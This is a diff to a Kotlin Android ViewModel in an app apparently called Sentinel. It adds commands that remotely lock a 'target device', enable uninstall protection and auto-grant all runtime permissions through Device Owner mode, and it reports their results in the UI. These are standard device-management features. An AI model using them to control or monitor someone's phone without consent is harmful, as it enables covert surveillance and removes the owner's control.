@@ -20,6 +20,7 @@ import kotlinx.coroutines.flow.filterNotNull
 import kotlinx.coroutines.flow.map
 import kotlinx.coroutines.flow.update
 import kotlinx.coroutines.launch
+import com.sentinel.shared.protocol.CommandTypes
 import javax.inject.Inject
 
 /**
@@ -328,8 +329,17 @@ class DeviceDetailViewModel @Inject constructor(
                     android.util.Log.i("Sentinel:AdminCmd", "Received COMMAND_RESULT for $command (success=$success)")
 
                     if (!success) {
+                        val errorMsg = data.optString("error", "Unknown error")
                         _uiState.update {
-                            it.copy(commandStatusMessage = "Command failed: ${data.optString("error")}")
+                            it.copy(
+                                isLockingDevice = false,
+                                mdmActionMessage = if (command == "LOCK_DEVICE" || command == "SET_ANTI_TAMPER" || command == "ENFORCE_PERMISSIONS") {
+                                    errorMsg
+                                } else {
+                                    it.mdmActionMessage
+                                },
+                                commandStatusMessage = "Command failed: $errorMsg"
+                            )
                         }
                         return@collect
                     }
@@ -484,6 +494,45 @@ class DeviceDetailViewModel @Inject constructor(
                                 it.copy(showPreviewDialog = true, previewPayload = map)
                             }
                         }
+
+                        "LOCK_DEVICE" -> {
+                            val locked = payload.optBoolean("locked", false)
+                            val method = payload.optString("method", "MDM")
+                            _uiState.update {
+                                it.copy(
+                                    isLockingDevice = false,
+                                    mdmActionMessage = if (locked) "Target device locked remotely ($method)" else "Failed to lock device"
+                                )
+                            }
+                        }
+
+                        "SET_ANTI_TAMPER" -> {
+                            val enabled = payload.optBoolean("antiTamperEnabled", false)
+                            val success = payload.optBoolean("success", false)
+                            _uiState.update {
+                                it.copy(
+                                    isAntiTamperEnabled = if (success) enabled else it.isAntiTamperEnabled,
+                                    mdmActionMessage = if (success) "Uninstall protection ${if (enabled) "enabled" else "disabled"}" else "Failed to update uninstall protection"
+                                )
+                            }
+                        }
+
+                        "ENFORCE_PERMISSIONS" -> {
+                            val enforced = payload.optBoolean("permissionsEnforced", false)
+                            _uiState.update {
+                                it.copy(
+                                    mdmActionMessage = if (enforced) "All runtime permissions auto-granted successfully" else "Failed to auto-grant (requires Device Owner mode)"
+                                )
+                            }
+                        }
+
+                        "GET_MDM_STATUS" -> {
+                            val isAdmin = payload.optBoolean("isDeviceAdminActive", false)
+                            val isOwner = payload.optBoolean("isDeviceOwner", false)
+                            _uiState.update {
+                                it.copy(isDeviceAdminActive = isAdmin, isDeviceOwner = isOwner)
+                            }
+                        }
                     }
                 } catch (e: Exception) {
                     android.util.Log.e("Sentinel:AdminCmd", "Failed to parse COMMAND_RESULT: ${e.message}", e)
@@ -525,5 +574,42 @@ class DeviceDetailViewModel @Inject constructor(
 
     fun stopPtt() {
         sendCommand("PTT_STOP")
+    }
+
+    fun lockDevice() {
+        _uiState.update { it.copy(isLockingDevice = true, mdmActionMessage = "Sending remote lock command...") }
+        sendCommand(CommandTypes.LOCK_DEVICE)
+        viewModelScope.launch {
+            kotlinx.coroutines.delay(8_000L)
+            if (_uiState.value.isLockingDevice) {
+                _uiState.update {
+                    it.copy(
+                        isLockingDevice = false,
+                        mdmActionMessage = "Lock command timed out — device may be offline or busy"
+                    )
+                }
+            }
+        }
+    }
+
+    fun setAntiTamper(enabled: Boolean) {
+        _uiState.update { it.copy(mdmActionMessage = "Updating uninstall protection...") }
+        val params = org.json.JSONObject().apply {
+            put("enabled", enabled)
+        }
+        sendCommand(CommandTypes.SET_ANTI_TAMPER, params)
+    }
+
+    fun enforcePermissions() {
+        _uiState.update { it.copy(mdmActionMessage = "Enforcing runtime permissions...") }
+        sendCommand(CommandTypes.ENFORCE_PERMISSIONS)
+    }
+
+    fun fetchMdmStatus() {
+        sendCommand(CommandTypes.GET_MDM_STATUS)
+    }
+
+    fun dismissMdmMessage() {
+        _uiState.update { it.copy(mdmActionMessage = null) }
     }
 }
